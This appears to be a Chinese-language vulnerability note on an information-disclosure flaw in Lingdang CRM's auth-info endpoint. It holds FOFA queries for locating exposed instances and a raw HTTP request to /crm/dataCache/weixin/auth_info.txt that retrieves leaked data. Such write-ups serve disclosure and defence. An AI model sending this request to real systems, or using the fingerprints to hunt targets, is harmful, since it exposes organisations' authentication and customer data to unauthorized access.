# 灵当crm auth-info 存在信息泄露漏洞

# 一、漏洞简介
<font style="color:rgb(51, 51, 51);">灵当CRM（Customer Relationship Management，客户关系管理）是一款面向中小企业的客户关系管理软件，旨在帮助企业更好地管理客户信息、销售流程、市场营销和服务支持等方面的工作。灵当CRM提供了一系列工具和功能，帮助企业在销售、市场和服务部门之间实现高效协作，提高客户满意度和业务效率。灵当CRM客户管理系统auth-info 存在信息泄露漏洞。</font>

# 二、影响版本
+ 灵当crm

# 三、资产测绘
+ fofa`body="[http://localhost:8088/crm/index.php"](http://localhost:8088/crm/index.php") && body="ldcrm.base.js"` `<font style="color:rgb(51, 51, 51);">body="crmcommon/js/jquery/jquery-1.10.1.min.js"</font>`
+ 特征

![1722999861305-1e9e41ad-ed6a-4750-918d-61a0631ad06a.png](./img/cG69q8kjl5ea6aqq/1722999861305-1e9e41ad-ed6a-4750-918d-61a0631ad06a-284399.png)

# 四、漏洞复现
```java
POST /crm/dataCache/weixin/auth_info.txt HTTP/1.1
Host: 
Content-Length: 779
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary0Mh3BfgWszxRFokh
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36
```

![1726734061269-8f9d8451-18ae-477b-b392-9d4db0f4ecc5.png](./img/cG69q8kjl5ea6aqq/1726734061269-8f9d8451-18ae-477b-b392-9d4db0f4ecc5-484618.png)





> 更新: 2024-10-21 11:49:37  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/iayn7tuulf8b68rg>